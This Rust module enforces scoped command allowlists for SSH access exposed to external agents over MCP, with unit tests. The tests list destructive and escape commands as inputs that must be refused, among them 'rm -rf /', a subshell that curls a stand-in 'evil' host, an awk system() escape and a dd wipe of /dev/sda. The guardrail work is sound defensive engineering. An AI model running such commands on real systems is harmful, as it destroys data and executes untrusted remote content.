//! Command policy for MCP-exposed SSH profiles.
//!
//! An external agent gets a *scope*, not a shell. The scope is picked per
//! connection in the SSH panel and enforced here, before the command ever
//! reaches the remote host:
//!
//!   read_only        logs, status, file reads              (the default)
//!   service_control  read_only + start/stop/restart units
//!   full             anything
//!
//! This is a guardrail, not a sandbox: it inspects the command string.
//! Whoever holds the MCP token can still pick `full` on a connection the
//! user exposed, and a shell can always be reached through a binary that
//! runs sub-commands. The point is that the *default* exposure cannot be
//! turned into `rm -rf /` by a mis-prompted agent, and that the refusal
//! tells the agent what it is allowed to do instead.

use std::path::Path;

/// Per-connection capability level. Stored as text in `mcp_grants.scope`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SshScope {
    ReadOnly,
    ServiceControl,
    Full,
}

impl SshScope {
    /// Unknown / missing values fall back to the safest scope rather than
    /// failing open.
    pub fn parse(value: &str) -> Self {
        match value.trim().to_ascii_lowercase().as_str() {
            "service_control" => Self::ServiceControl,
            "full" => Self::Full,
            _ => Self::ReadOnly,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Self::ReadOnly => "read_only",
            Self::ServiceControl => "service_control",
            Self::Full => "full",
        }
    }

    pub fn summary(self) -> &'static str {
        match self {
            Self::ReadOnly => "read-only: logs, status and file reads",
            Self::ServiceControl => "service control: read-only plus start/stop/restart",
            Self::Full => "full: any command",
        }
    }
}

/// Check one command string against the scope. `Ok(())` = may run.
pub fn check_command(scope: SshScope, command: &str) -> Result<(), String> {
    if scope == SshScope::Full {
        return Ok(());
    }
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("empty command".to_string());
    }

    // Refuse the shell constructs that let a short command turn into
    // arbitrary execution / file writes. `|`, `;`, `&&`, `||` are handled
    // by splitting below, so each *segment* is validated on its own.
    for bad in ["$(", "`", ">", "<", "\n", "\r", "\\\n"] {
        if trimmed.contains(bad) {
            return Err(format!(
                "scope {} does not allow `{}` (no redirection, subshells or background jobs). {}",
                scope.as_str(),
                bad,
                guidance(scope)
            ));
        }
    }

    for segment in split_segments(trimmed) {
        let segment = segment.trim();
        if segment.is_empty() {
            continue;
        }
        // `&` was left alone above so `&&` could be split; anything still
        // carrying one is a background job (`cmd &`), which we refuse.
        if segment.contains('&') {
            return Err(format!(
                "scope {} does not allow background jobs (`&`). {}",
                scope.as_str(),
                guidance(scope)
            ));
        }
        check_segment(scope, segment)?;
    }
    Ok(())
}

/// Split on the operators that chain commands, so `journalctl | grep x`
/// validates both halves. Order matters: two-char operators first.
fn split_segments(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let bytes: Vec<char> = command.chars().collect();
    let mut i = 0;
    while i < bytes.len() {
        let a = bytes[i];
        let b = bytes.get(i + 1).copied();
        match (a, b) {
            ('&', Some('&')) | ('|', Some('|')) => {
                out.push(current.clone());
                current.clear();
                i += 2;
            }
            (';', _) | ('|', _) => {
                out.push(current.clone());
                current.clear();
                i += 1;
            }
            _ => {
                current.push(a);
                i += 1;
            }
        }
    }
    out.push(current);
    out
}

fn check_segment(scope: SshScope, segment: &str) -> Result<(), String> {
    let tokens = shell_words::split(segment).map_err(|e| {
        format!(
            "scope {} could not parse `{}`: {}",
            scope.as_str(),
            segment,
            e
        )
    })?;
    if tokens.is_empty() {
        return Ok(());
    }
    let mut idx = 0;

    // `sudo` / `sudo -n` just elevates; the command behind it is still
    // validated, so allowing it keeps log reads working on hardened hosts.
    if basename(&tokens[idx]) == "sudo" {
        idx += 1;
        while idx < tokens.len() && tokens[idx].starts_with('-') {
            // Only the non-interactive flag is safe to pass along.
            if tokens[idx] != "-n" {
                return Err(format!(
                    "scope {} does not allow `sudo {}`; use `sudo -n <command>` or a root-capable profile. {}",
                    scope.as_str(),
                    tokens[idx],
                    guidance(scope)
                ));
            }
            idx += 1;
        }
        if idx >= tokens.len() {
            return Err("`sudo` needs a command".to_string());
        }
    }

    let program = basename(&tokens[idx]);
    let args: Vec<&str> = tokens[idx + 1..]
        .iter()
        .map(|s| s.as_str())
        .filter(|a| !a.starts_with('-'))
        .collect();

    if is_read_program(&program) {
        return Ok(());
    }
    let read_sub = read_subcommands(&program);
    let write_sub = write_subcommands(&program);
    if read_sub.is_empty() && write_sub.is_empty() {
        // Not a tool we know at all — fall through to the refusal below.
    } else if args.is_empty() {
        // Bare `docker` / `systemctl` just prints usage. Harmless.
        return Ok(());
    } else if let Some(verb) = subcommand_of(&program, &args) {
        if read_sub.contains(&verb) {
            return Ok(());
        }
        if scope == SshScope::ServiceControl && write_sub.contains(&verb) {
            return Ok(());
        }
    }

    Err(format!(
        "scope {} does not allow `{}`. {}",
        scope.as_str(),
        program,
        guidance(scope)
    ))
}

/// Where the subcommand lives in `args`. Almost always the first
/// non-flag token; SysV `service <unit> <verb>` puts it second.
fn subcommand_of<'a>(program: &str, args: &[&'a str]) -> Option<&'a str> {
    if program == "service" {
        args.get(1).copied()
    } else {
        args.first().copied()
    }
}

fn basename(token: &str) -> String {
    Path::new(token)
        .file_name()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| token.to_string())
}

/// Programs that only ever read. Anything able to write, execute another
/// program, or take a `-exec`/`-i` style flag is deliberately absent.
fn is_read_program(program: &str) -> bool {
    matches!(
        program,
        "cat"
            | "head"
            | "tail"
            | "less"
            | "more"
            | "grep"
            | "egrep"
            | "fgrep"
            | "rg"
            | "wc"
            | "sort"
            | "uniq"
            | "cut"
            | "tr"
            | "ls"
            | "stat"
            | "file"
            | "du"
            | "df"
            | "free"
            | "uptime"
            | "ps"
            | "pgrep"
            | "uname"
            | "whoami"
            | "id"
            | "groups"
            | "hostname"
            | "date"
            | "lsblk"
            | "lscpu"
            | "lsmod"
            | "iostat"
            | "vmstat"
            | "mpstat"
            | "ss"
            | "netstat"
            | "journalctl"
            | "dmesg"
            | "last"
            | "w"
            | "who"
            | "printenv"
            | "echo"
    )
}

/// Subcommand allowlists for tools that both read and mutate.
fn read_subcommands(program: &str) -> &'static [&'static str] {
    match program {
        "systemctl" => &[
            "status",
            "is-active",
            "is-enabled",
            "is-failed",
            "list-units",
            "list-unit-files",
            "list-timers",
            "list-sockets",
            "show",
            "cat",
            "get-default",
        ],
        "docker" | "podman" => &["ps", "logs", "inspect", "stats", "images", "info", "port"],
        "kubectl" => &["get", "describe", "logs", "top", "version"],
        "ip" => &["addr", "a", "route", "r", "link", "neigh", "n"],
        "git" => &["log", "status", "show", "diff", "branch", "remote"],
        _ => &[],
    }
}

/// Extra subcommands unlocked by `service_control`.
fn write_subcommands(program: &str) -> &'static [&'static str] {
    match program {
        "systemctl" => &[
            "restart",
            "start",
            "stop",
            "reload",
            "try-restart",
            "reload-or-restart",
            "daemon-reload",
        ],
        "docker" | "podman" => &["restart", "start", "stop"],
        "kubectl" => &["rollout"],
        "service" => &["restart", "start", "stop"],
        _ => &[],
    }
}

/// What the caller *can* do — included in every refusal so the agent can
/// correct itself without another round of guessing.
fn guidance(scope: SshScope) -> String {
    match scope {
        SshScope::ReadOnly => {
            "Allowed: log/status reads (journalctl, tail, cat, grep, ps, df, …), \
             `systemctl status|show`, `docker ps|logs|inspect`, `kubectl get|describe|logs`. \
             Pipes are fine; redirection, subshells and background jobs are not."
                .to_string()
        }
        SshScope::ServiceControl => "Allowed: everything read-only, plus \
             `systemctl start|stop|restart|reload`, `docker start|stop|restart`, \
             `kubectl rollout`, `service <name> start|stop|restart`."
            .to_string(),
        SshScope::Full => "No restriction.".to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn read_only_allows_logs_and_status() {
        let scope = SshScope::ReadOnly;
        for cmd in [
            "journalctl -u nginx --no-pager -n 200",
            "journalctl -u nginx | grep -i error",
            "tail -n 100 /var/log/syslog && grep oops /var/log/syslog",
            "systemctl status nginx",
            "systemctl --no-pager status docker",
            "docker ps -a",
            "docker logs --tail 50 web",
            "kubectl get pods -A",
            "sudo -n journalctl -u ssh -n 50",
            "/usr/bin/df -h",
            "ps aux | grep java | head",
        ] {
            assert!(check_command(scope, cmd).is_ok(), "should allow: {}", cmd);
        }
    }

    #[test]
    fn read_only_refuses_mutation_and_shell_escapes() {
        let scope = SshScope::ReadOnly;
        for cmd in [
            "rm -rf /var/log",
            "systemctl restart nginx",
            "docker restart web",
            "echo hi > /etc/motd",
            "cat /etc/passwd | tee /tmp/x",
            "ps; rm -rf /",
            "sh -c 'rm -rf /'",
            "cat $(curl -s http://evil/x)",
            "tail -f /var/log/syslog &",
            "awk 'BEGIN{system(\"rm -rf /\")}' /etc/hosts",
        ] {
            assert!(check_command(scope, cmd).is_err(), "should refuse: {}", cmd);
        }
    }

    #[test]
    fn service_control_adds_restarts_only() {
        let scope = SshScope::ServiceControl;
        for cmd in [
            "systemctl restart nginx",
            "sudo systemctl reload nginx",
            "docker restart web",
            "kubectl rollout restart deploy/web",
            "service nginx restart",
        ] {
            assert!(check_command(scope, cmd).is_ok(), "should allow: {}", cmd);
        }
        for cmd in [
            "rm -rf /",
            "systemctl disable nginx",
            "systemctl mask nginx",
            "docker rm -f web",
            "dd if=/dev/zero of=/dev/sda",
        ] {
            assert!(check_command(scope, cmd).is_err(), "should refuse: {}", cmd);
        }
    }

    #[test]
    fn full_allows_anything() {
        assert!(check_command(SshScope::Full, "rm -rf /tmp/x; echo done > /tmp/y").is_ok());
    }

    #[test]
    fn unknown_scope_falls_back_to_read_only() {
        assert_eq!(SshScope::parse("nonsense"), SshScope::ReadOnly);
        assert_eq!(SshScope::parse(""), SshScope::ReadOnly);
        assert_eq!(SshScope::parse("SERVICE_CONTROL"), SshScope::ServiceControl);
    }

    #[test]
    fn refusals_name_the_scope_and_the_alternatives() {
        let err = check_command(SshScope::ReadOnly, "systemctl restart nginx").unwrap_err();
        assert!(err.contains("read_only"), "{}", err);
        assert!(err.contains("systemctl status"), "{}", err);
    }
}
